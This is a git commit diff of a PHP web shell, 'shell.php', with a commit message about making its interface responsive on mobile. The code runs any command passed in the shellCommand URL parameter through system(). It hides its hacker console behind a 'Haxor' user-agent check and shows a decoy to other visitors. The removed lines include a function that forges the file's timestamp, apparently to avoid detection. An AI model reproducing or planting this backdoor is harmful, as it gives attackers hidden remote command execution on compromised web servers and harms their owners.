e5cff77693354b5b9d96bd17ba81444e52a43531
pry0cc <pry0cc@protonmail.com>
2016-12-28 01:54:38 +0000

    Made responsive and looks less ugly on mobile

--- shell.php
+++ shell.php
@@ -1,64 +1,16 @@
-<?php
-	error_reporting(E_ALL);
-	
+<?php	
 	$ip = $_SERVER['SERVER_ADDR'];
 	$port = $_SERVER['SERVER_PORT'];
 	$file = basename(__FILE__); 
 	$connectstr = "http://".$ip.":".$port."/".$file;
-
-	class UserInterface
-	{
-		public $pwd = "";
-		private $currentUser = "";
-		private $mode = "r";
-		private $errorToo = '2>&1';
-		private $command = "";
-
-		public function doCommand($command)
-		{
-			return system($command." 2>&1");
-		}
-		
-		public function getPwd()
-		{
-			$this->doCommand("/bin/pwd");
-		}
-
-		public function cd($path)
-		{
-			chdir($path);
-		}
-
-		public function timeStamp($stamp)
-		{
-			$nothing = popen("touch " . __FILE__ . " -t {$stamp}",$this->mode);
-		}
-	}
-
-	$userInterface = new UserInterface();
 ?>
 
-
-<?php if (isset($_GET['command']) || isset($_GET['shellCommand'])): ?>
+<?php if (isset($_GET['shellCommand'])): ?>
 <?php
-	if(isset($_GET['command'])) {
-		$command = $_GET['command'];
-		switch($command) {
-			case "pwd":
-				$userInterface->getPwd();
-				break;
-			case "perm":
-				$permissions = $userInterface.getPermissions();
-				break;
-			case "ps":
-				$processes = $userInterface.getProcesses();
-				break;
-		}
-	}
-	
-	if(isset($_GET['shellCommand'])) {
-		$myCommand = $_GET['shellCommand'];
-		$shellOut = $userInterface->doCommand($myCommand);
+
+	if(isset($_GET['shellCommand'])) 
+	{
+		system($_GET['shellCommand']." 2>&1");
 	}
 
 
@@ -69,11 +21,8 @@
 <%= $page %>
 </div>
 
-
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-
 <div id="haxored" hidden="true">
-
 <style rel="stylesheet" type="text/css">
 #XmenuNav {
 	background-color: #161616;
@@ -92,45 +41,87 @@
 }
 
 #XmenuNav #home {
-	background-color: #2d2d2d;
-	color: #fff;
-	border: 0px;
+	background-color: #2D2D2D;
+	color: #FFFFFF;
+	border: 0;
 }
 
 
 #XmenuNav li button {
 	height: 100%;
 	outline: none;
-	border: 0px;
+	border: 0;
 	padding: 0 10px;	
 	float: left;
-	color: #605e56;
+	color: #605E56;
 	background-color: #161616;
 }
 
 #XmenuNav li button:hover {
-	background-color: #2d2d2d;
-	color: #fff;
-	border: 0px;
+	background-color: #2D2D2D;
+	color: #FFFFFF;
+	border: 0;
 }
 
 #XmenuNav li button:active {
-	color: #605e56;
+	color: #605E56;
 }
 
 #XmenuStats ul li {
-	color: #cad0c4;
+	color: #CAD0C4;
 	float: right;
 	padding: 12px 10px;
 	margin-right: 30px;
 }
 
+@media screen and (max-width: 850px) {
+	#XmenuStats {
+		display: none !important;
+	}
+}
+
+@media screen and (max-width: 510px) {
+	#XmenuNav {
+		display: none !important;
+	}
+
+	#XmainShell {
+		height: 100% !important;
+	}
+}
+	
+@media screen and (max-height: 582px) {
+	#XmainShell {
+		height: 85% !important;
+	}
+}
+
+@media screen and (max-height: 502px) {
+	#XmainShell {
+		height: 85% !important;
+	}
+
+	#XmenuStats {
+		display: none !important;
+	}
+}
+
+@media screen and (max-height: 452px) {
+	#XmainShell {
+		height: 70% !important;
+	}
+}
+
+#XmainContainer {
+	background-color: #1F1F1F;
+	height: 100%;
+}
+
 #XmainShell {
-	height: 90%;
+	height: 93%;
 	padding: 20px 0px;
-	margin: 0px;
-	background-color: #1f1f1f;
-	color: #fff;
+	margin: 0;
+	color: #FFFFFF;
 	width: 100%;
 }
 
@@ -145,12 +136,12 @@
 #XinputShell input {
 	width: 100%;
 	height: 50px;
-	border: 0px;
+	border: 0;
 	outline: none;
 	padding-left: 10px;
 	font-family: monospace;
 	font-size: 15px;
-	color: #cad0c4;
+	color: #CAD0C4;
 	background-color: #323232;
 }
 
@@ -159,8 +150,8 @@
 	margin-left: 5%;
 	margin-right:5%;
 	padding-left: 2%;
-	padding-right: 0px;
-	background-color: #2d2d2d;
+	padding-right: 0;
+	background-color: #2D2D2D;
 	height: 80%;
 }
 
@@ -172,33 +163,33 @@
 	padding-top: 15px;
 }
 
-
 #XShellOutput pre {
 	display: inline;
 }
 
 #XShellOutput .command {
-	color: #1793d1;
+	color: #1793D1;
 }
 
 #XShellOutput .output {
-	color: #cad0c4;
-	padding-bottom:40px;
+	color: #CAD0C4;
+	padding-bottom: 40px;
 }
 
 </style>
 <div id="Xcontainer">
 	<div id="XmenuNav">
 		<ul class="XmenuOptions">
-			<li><button id="home"> Home </button></li>
+			<li><button id="home" value="ls"> Home </button></li>
 			<li><button id="XbuttonPwd" name="command" value="pwd">PWD</button></li>
 			<li><button id="XbuttonPerm" name="command" value="whoami">Permissions</button></li>
 			<li><button id="XbuttonPs" name="command" value="ps">Processes</button></li>
 			<li><button id="XbuttonIfconfig" name="command" value="ifconfig">Networking</button></li>
+			<li><button id="XbuttonPing" name="command" value="ping -c 1 google.com">Ping G</button></li>
 		</ul>
 		<div id="XmenuStats">
 			<ul>
-				<li id="XPHPversion"> PHP </li>
+				<li id="XPHPversion"></li>
 			</ul>
 		</div>
 	<br>
@@ -216,23 +207,27 @@
 	
 	<script type="text/javascript">	
 		$(document).ready( function() {
-			
+			// Checks if user agent is correct.
 			if(navigator.userAgent == "Haxor") {
 				console.log("Hello Master.")
-				$("body").css({"margin":"0px"});
+				$("body").css({"margin":"0"});
 				$("#luserContent").remove();
 				$("#haxored").prop("hidden", false);
 			} else {
-				console.log("#");	
 				$("#haxored").remove();
 			}
 
+			// Array for command history
 			var history = [];
+			
+			// Counter used for cycling through command history
 			var counter = 0;
+
+			// The things displayed in the shell - can be anything.
 			var user = "badass";
 			var hostname = "microserver";
-			var request = "";
 
+			// This function requests command to be executed and then calls renderCmd.
 			function submit(command) {
 				history.push(command);
 				$.ajax({
@@ -244,55 +239,50 @@
 					}
 				});
 			}
-		
+
+			// This function takes the command output and displays it in the output div.
 			function renderCmd(command, output) {
 				var time = new Date().toLocaleTimeString('en-GB', { hour: "numeric", minute: "numeric"});
-				$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre>");
+				$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre><br>");
 				$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
 				$("#XShellOutput").scrollTop($("#XShellOutput")[0].scrollHeight);
 			}
-	
-			$("#XbuttonPwd").on('click', function(e) {
-				e.preventDefault();
-				request = "pwd";
-				submit(request);
-			});
+			
+			// This function maps any item ID to a submit command based on value. Give anything a value="command" and make it clickable.
+			function addMenuOption(button_id) {
+				$(button_id).on('click', function(e) {
+					submit($(this).val());
+				});
+			}
 
-			$("#XbuttonPerm").on('click', function(e) {
-				e.preventDefault();
-				request = "whoami";
-				submit(request);
+			// This messy bit of code cycles through all the items on the menu bar and makes them clickable. using the above function.
+			$("ul").children('li').children('button').each(function() {
+				addMenuOption("#" + $(this).attr('id'));
 			});
-
-			$("#XbuttonPs").on('click', function(e) {
-				e.preventDefault();
-				request = "ps";
-				submit(request);
-			});
-
-			$("#XbuttonIfconfig").on('click', function(e) {
-				e.preventDefault();
-				request = "ifconfig";
-				submit(request);
-			});
-
+			
+			// This handles the arrow key cycling of history and commands.
 			var inputshell = document.getElementById("XinputShell");
 			inputshell.addEventListener("keydown", function(e) {
+				
+				// Clear ShellInput when Enter is pressed
 				if (e.which == 13) {
 					submit($("#shellInput").val());
 					$("#shellInput").val("");
 				}
-		
+				
+				// Go back in history when UP is pressed
 				if (e.which == 38 && counter < history.length) {
 					counter += 1;
 					$("#shellInput").val(history[history.length - counter]);
 				}
 
+				// Go Forward in history when DOWN is pressed
 				if (e.which == 40 && counter > 0) {
 					counter -= 1;
 					$("#shellInput").val(history[history.length - counter]);
 				}
-
+				
+				// Clear ShellOutput when CTRL+Z is pressed/
 				if (e.keyCode == 90 && e.ctrlKey) {
 					$("#XShellOutput").empty();
 				}
